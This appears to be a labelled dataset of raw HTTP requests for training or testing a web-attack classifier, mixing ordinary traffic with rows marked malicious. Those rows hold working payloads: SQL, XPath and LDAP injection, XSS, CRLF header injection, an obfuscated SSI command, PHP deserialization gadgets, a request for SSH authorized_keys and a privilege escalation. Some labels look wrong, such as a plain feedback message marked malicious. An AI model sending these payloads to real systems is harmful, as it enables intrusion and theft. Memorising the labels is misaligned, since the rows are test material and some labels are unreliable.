label,text
benign,"POST /membership/join HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Content-Type: application/xml
Accept: text/*
Content-Length: 127
Connection: keep-alive
Referer: https://my-personal-blog-site.info/membership/signup

<membership>
  <name>Rachel Morgan</name>
  <email>rachel.morgan77@example.com</email>
  <plan>basic</plan>
</membership>"
benign,"POST /reports/quarterly/upload HTTP/1.1
Host: finance-and-accounting.co
Content-Type: text/csv
Content-Length: 101
User-Agent: Bingbot/2.0 (+http://www.bing.com/bingbot.htm)
Accept: text/csv
Connection: close

Quarter,Revenue,Expenses,Profit
Q1-2024,1000000,750000,250000
Q2-2024,1250000,800000,450000"
malicious,"GET /data/export/csv%0d%0aX-Evil-Header:%20yes%0d%0aContent-Length:%2027%0d%0a%0d%0a<script>window.location=1</script> HTTP/1.1
Host: analytics-reporting-service.ai
User-Agent: Python-urllib/3.8
Accept: */*
Referer: https://analytics-reporting-service.ai/dashboard
Cache-Control: max-age=0"
benign,"PUT /api/v2/files/userdata/43f2a9da8/upload HTTP/1.1
Host: digital-archive-services.ai
Content-Type: application/octet-stream
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:112.0) Gecko/20100101 Firefox/112.0
Content-Length: 455
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
Accept-Language: en-US,en;q=0.5
Cache-Control: no-store
Origin: https://digital-archive-services.ai
Connection: keep-alive

VGhpcyBmaWxlIGNvbnRhaW5zIHVzZXIgZGF0YSBwZXJzaXN0aW5nIGEgY29tcGxldGUgYXBwbGljYXRpb24gZGF0YSBzZXQuIGluY2x1ZGluZyBuYW1lLCB1c2VyIGlkLCBhbmQgc3VibWl0dGVkIGFycmF5IG9mIGFueXRoaW5nLg=="
malicious,"POST /api/v2/data/query HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Content-Length: 126
Connection: keep-alive
Cookie: session_token=4f7a9d2e1c8b3a7f9d0e5b1a2c7d8e4f

{""query"": ""/users/user[username='admin' and substring(password,1,1)='p']/id""}"
benign,"GET /local/food/festival-summer-menus HTTP/1.1
Host: citybites-daily.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9
Accept-Language: en-US,en;q=0.6
Referer: https://citybites-daily.biz/local/food/
Upgrade-Insecure-Requests: 1
DNT: 1
Connection: keep-alive"
malicious,"POST /services/input/regex-check HTTP/1.1
Host: secure-validation-node.online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Content-Type: application/json
Accept: application/json, text/html, */*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Cache-Control: no-cache
Referer: https://secure-validation-node.online-retail-store.biz/app/submit
Origin: https://secure-validation-node.online-retail-store.biz
Sec-CH-UA: "" Not A;Brand"";v=""99"", ""Safari"";v=""14"", ""Mobile Safari"";v=""14""
Sec-CH-UA-Mobile: ?1
Sec-CH-UA-Platform: ""iOS""
Content-Length: 189

{""complex_pattern_input"": ""abababababababababababababababababababababababababababababababababababX""}"
benign,"GET /api/v1/reports/summary?token=c2VjdXJlX2VtYWlsX2ZpbHRlcg==&config=eyJsaW1pdCI6MjAsIm9yZGVyIjoiZGVzYyJ9 HTTP/1.1
Host: analytics-data-cloud.ai
Accept: application/json
User-Agent: curl/7.79.1
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /ldapsearch HTTP/1.1
Host: corporate-ldap-gateway.net
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 53

user_id=validuser%29%28objectClass%3D*%29%26attributes%3D*"
benign,"POST /register HTTP/1.1
Host: user-auth-connect.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 95
Referer: https://user-auth-connect.org/register
Origin: https://user-auth-connect.org
Cookie: session_id=3f8d2e7b9c1a4f57a3d2e6b4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Connection: keep-alive

username=ameliaw&email=amelia.williams%40mailbox.net&password=Sunflower78&password_confirm=Sunflower78&terms_accepted=true"
benign,"GET /media/images/banner-header.jpg HTTP/1.1
Host: assets-secure-streaming.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
If-Modified-Since: Tue, 30 May 2023 15:42:17 GMT
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"POST /user/feedback/submit HTTP/1.1
Host: feedback-portal-cloud.ai
Authorization: Bearer feedbacktoken987654321mnop
Content-Type: application/json
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
Content-Length: 137

{
  ""feedback.title-text"": ""Loved the new UI update!"",
  ""feedback.details-body"": ""The dashboard looks clean and has improved navigation. Great work!"",
  ""user-info.email-contact"": ""emilyw@example-mail.ai"",
  ""submission.metadata.timestamp"": ""2024-06-13T17:22:15Z""
}"
benign,"POST /oauth/token HTTP/1.1
Host: auth.securelogin-hub.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 117
Authorization: Basic bXNlY3VyZUNsaWVudDpTZWNyZXQxMjM=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Connection: keep-alive

grant_type=authorization_code&code=4f3d9a7b2cce4&redirect_uri=https%3A%2F%2Fapp.securelogin-hub.net%2Fcallback&client_id=msclient&client_secret=Secret123"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fweather-trends-online.org%2Fdata%2Fsummary%2Fdaily HTTP/1.1
Host: data.weather-trends-online.org
Accept: application/json
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
Accept-Language: en-US,en;q=0.6
Connection: keep-alive"
benign,"DELETE /admin/orders/03298 HTTP/1.1
Host: online-retail-store.biz
Authorization: Bearer ih4gs9s17d8fjh3948dhrk27fue9xk27
X-Confirm-Delete: true
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1
Accept: application/json
Accept-Language: en-US,en;q=0.7
Connection: keep-alive"
benign,"GET /blog-sitemap.xml HTTP/1.1
Host: neoteric-green-energy.info
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
Accept: application/xml
Accept-Language: en-us
Referer: https://neoteric-green-energy.info/home
Connection: keep-alive"
benign,"GET /scripts/v2/app.js HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Lynx/2.8.9rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/1.1.1k
Accept: application/javascript, */*;q=0.1
Accept-Encoding: gzip, deflate
Accept-Language: en-gb
Connection: keep-alive"
benign,"GET /v3/accounts/acc_7834e2f81 HTTP/1.1
Host: finance-data-hub.cloud
Accept: application/json
Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==
User-Agent: curl/7.88.1
Accept-Encoding: deflate, gzip
Cache-Control: no-cache"
benign,"POST /scripts/update-loader.js HTTP/1.1
Host: assets.media-platform.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/javascript
Content-Length: 32
Accept: */*
Connection: keep-alive

console.log('Loader script updated.');"
benign,"GET /sitemap.xml HTTP/1.1
Host: alpine-adventures-outdoors.org
Accept: application/xml
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.7,en;q=0.3
Connection: close"
malicious,"POST /discussion/topic/post HTTP/1.1
Host: discussion-web-techhub.net
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)
Content-Type: application/x-www-form-urlencoded
Content-Length: 179
Accept-Encoding: br,gzip,deflate
Accept-Language: en-US,en;q=0.9
Origin: https://discussion-web-techhub.net

topic_id=7891&poster=automationBot&content=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E&subscribe=yes"
benign,"DELETE /api/v1/blog/posts/23789 HTTP/1.1
Host: community.game-dev-forum.org
Authorization: Bearer mnbvcxzlkjhgfdsapoiuytrewq123456
If-Match: ""92abd4e""
Accept: application/vnd.api+json
Referer: https://community.game-dev-forum.org/blog/posts/23789
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Safari/605.1.15
Connection: keep-alive"
benign,"GET /events/calendar?type=conference&type=meetup&type=workshop&timezone=EST HTTP/1.1
Host: next-gen-collab-platform.com
Accept: text/html,application/xhtml+xml
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Connection: close"
malicious,"POST /cms/plugin_config HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml;q=0.9,application/xml;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Referer: https://secure-user-portal.net/cms/plugin_config
Content-Length: 230

gadget_chain_b64=TzozNjoiTW9ub2xvZ1xMYWNrU3FscExvZ2dlciI6MTp7czozOiJsb2ciO3M6MzE6IltTeXNUcmFjZV09PSdmIl0gc3VwcmlzZXMgZXhwbG9pdCI7fQ=="
malicious,"POST /app/user/settings HTTP/1.1
Host: online-retail-store.biz
Content-Type: application/json
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/app/user/settings
User-Agent: Mozilla/5.0 (Linux; Android 11; MoT-AX) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36
Sec-CH-UA: ""Google Chrome"";v=""92"", "" Not A;Brand"";v=""99"", ""Chromium"";v=""92""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Android""
Content-Length: 180

{""settings"": {""custom_html"": ""<!--#exec cmd=\""c$(echo a)t /etc/hos$(echo t)name\""-->""}, ""extra"": true}"
malicious,"POST /account/update HTTP/1.1
Host: education-platform.online
User-Agent: Python-urllib/3.9
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 222
Connection: close

data_b64=TzozMToiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZEpTT05CcmluZ2VyIjozOntzOjU6InVzZXIiO3M6MTQ6ImFkbWluQGVkdWNhdGUiO3M6MTI6Imxhc3RfYWN0aW9uIjtpOjE2MDg2NjA0MDB9"
malicious,"PUT /api/config/get HTTP/1.1
Host: api.backup-solution.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: application/json, text/javascript
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 44
Connection: keep-alive

{""filePath"": ""/home/user/.ssh/authorized_keys""}"
benign,"POST /upload/docs HTTP/1.1
Host: data-management-platform.ai
Connection: keep-alive
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.136 Mobile Safari/537.36
Accept: application/json, text/plain, */*
Content-Type: multipart/form-data; boundary=----FormBoundary1234abcd
Content-Length: 548
Origin: https://data-management-platform.ai
Referer: https://data-management-platform.ai/dashboard
Accept-Encoding: gzip, deflate

------FormBoundary1234abcd
Content-Disposition: form-data; name=""document""; filename=""meeting_minutes.pdf""
Content-Type: application/pdf

%PDF-1.7
1 0 obj
<< /Length 44 >>
stream
BT /F1 24 Tf 100 700 Td (Minutes) Tj ET
endstream
endobj

------FormBoundary1234abcd
Content-Disposition: form-data; name=""meeting_date""

2024-06-12
------FormBoundary1234abcd
Content-Disposition: form-data; name=""department""

Operations
------FormBoundary1234abcd--"
benign,"GET /api/fetchMetadata?url=https%3A%2F%2Fedu-platform.ai%2Fcourses%2Fdata-science%2Fmodules%2Fintro HTTP/1.1
Host: api.edu-platform.ai
Accept: application/json
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate
Connection: keep-alive"
benign,"GET /api/v2/data/analyze?dataset_id=78945&format=csv&include_headers=true&filter_start=2023-01-01&filter_end=2023-04-30&group_by=region%2Cproduct&aggregate=sum&threshold=1000&timezone=UTC&lang=fr-FR&cache=false&preview=true HTTP/1.1
Host: insight-analytics.net
Connection: close
Accept: application/json,text/csv;q=0.8,*/*;q=0.5
User-Agent: curl/7.85.0
Referer: https://insight-analytics.net/dashboard"
benign,"HEAD /index.html HTTP/1.1
Host: digital-archive-services.net
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Cache-Control: no-cache
Connection: keep-alive"
benign,"GET /courses/python-programming/introduction HTTP/1.1
Host: code-academy-studio.ai
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: br, gzip
Referer: https://code-academy-studio.ai/dashboard
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Mobile/15E148 Safari/604.1"
malicious,"POST /admin/user/privileges HTTP/1.1
Host: enterprise-management-suite.biz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Content-Type: application/json
Referer: https://target-app.com/admin/dashboard
Content-Length: 72
Cookie: admin_session=2f0e7d81b6b5d6f1c839c5ef43dd84fa

{""userId"":4279,""privileges"":[""read"",""write"",""delete"",""superuser""]}"
benign,"PUT /profile/settings HTTP/1.1
Host: swift-finance-app.co
User-Agent: python-requests/2.28.2
Content-Type: application/json
Accept-Encoding: gzip, deflate
Content-Length: 61
Connection: keep-alive

{""bio"": ""Financial analyst &lt;b&gt;keen on data&lt;/b&gt; and cryptos""}"
benign,"POST /services/userprofile/modify HTTP/1.1
Host: profiles.community-game-dev-forum.org
Content-Type: application/soap+xml; charset=utf-8
Content-Length: 241
User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.92 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.8
DNT: 1
Connection: keep-alive
X-CSRF-Token: 32d7f90e2a9f8c67b16247b30bbcc8a3

<?xml version=""1.0"" encoding=""utf-8""?>
<soap:Envelope xmlns:soap=""http://www.w3.org/2003/05/soap-envelope"">
  <soap:Header/>
  <soap:Body>
    <UpdateProfile xmlns=""http://cgdf.example.org/profile"">
      <UserID>user_7924</UserID>
      <EmailPreferences>enabled</EmailPreferences>
    </UpdateProfile>
  </soap:Body>
</soap:Envelope>"
benign,"GET /blog/results?search=FROM%20the%20archives%20SELECT%20highlights HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: curl/7.88.1
Accept: */*
Connection: close"
benign,"POST /user/signup HTTP/1.1
Host: global-edu-platform.co
Content-Type: application/json
Accept: application/json
Origin: https://global-edu-platform.co
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
Connection: keep-alive
Content-Length: 182

{""email"":""maria.velasquez@global-edu-platform.co"",""password"":""EduPass!442"",""fullName"":""Maria Velasquez"",""age"":29,""educationLevel"":""Bachelor's"",""preferredLanguage"":""English""}"
benign,"GET /forum/posts?exec=load_recent HTTP/1.1
Host: community.game-dev-forum.org
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0
DNT: 1
Connection: close"
malicious,"POST /app/user/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/json
Content-Length: 185
Accept: application/json
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15

{""email"":""user.diane74@secure-user-portal.net"",""notifications"":true,""profile_bio"":""Experienced developer. Visit: javascript:alert('XSS')"",""theme"":""dark""}"
benign,"GET /static/v2/css/theme-dark.css HTTP/1.1
Host: cloud-products-tech.net
Accept: text/css,*/*;q=0.1
Referer: https://dashboard.cloud-products-tech.net/app/home
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Connection: keep-alive"
benign,"POST /logout HTTP/1.1
Host: user-center-edge.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 34
Origin: https://user-center-edge.net
Referer: https://user-center-edge.net/user/home
Cookie: sessionKey=f9c1b3e17d6a4771a0f5451ce4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0
Cache-Control: no-cache

csrf_auth=3kob4qe34pr9zx2pwdmz"
benign,"GET /robots.txt HTTP/1.1
Host: automotive-repair-shop.org
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Accept: text/plain, */*
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"GET /threads/popular?page=4 HTTP/1.1
Host: forumrealm.social
Connection: keep-alive
Accept: text/html,application/xhtml+xml
Accept-Encoding: gzip, deflate, br
Referer: https://forumrealm.social/
Cookie: sid=a0b1c2d3e4f567890123456789abcdef; last_view=1672291200
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1"
malicious,"GET /products/details?id=10%27%20UNION%20SELECT%20@@VERSION%2CSLEEP%285%29%2CUSER%28%29--%20 HTTP/1.1
Host: catalog.gourmet-kitchen.biz
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.7
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36
Cookie: sessionid=6f3d92a8c12b45d1a2cf189fa9d3e7b8; preferences=lang=en-US"
benign,"HEAD /downloads/installer.exe HTTP/1.1
Host: secure-file-repo.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Range: bytes=0-0"
benign,"GET /media/images/2024/04/press-release-photo.jpg HTTP/1.1
Host: newswire-press-release.io
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: br, gzip, deflate
Accept-Language: fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5
Connection: keep-alive
Referer: https://newswire-press-release.io/latest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36"
malicious,"POST /feedback/send HTTP/1.1
Host: feedback-collector-service.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/plain, */*; q=0.01
Content-Type: text/plain
Referer: https://trusted-marketing-partners.org/referral/start
Content-Length: 69
Cookie: feedback_token=9b124da8d0b7e3a041c158937ab238ef

User experienced issues with loading the homepage quickly but otherwise great service."
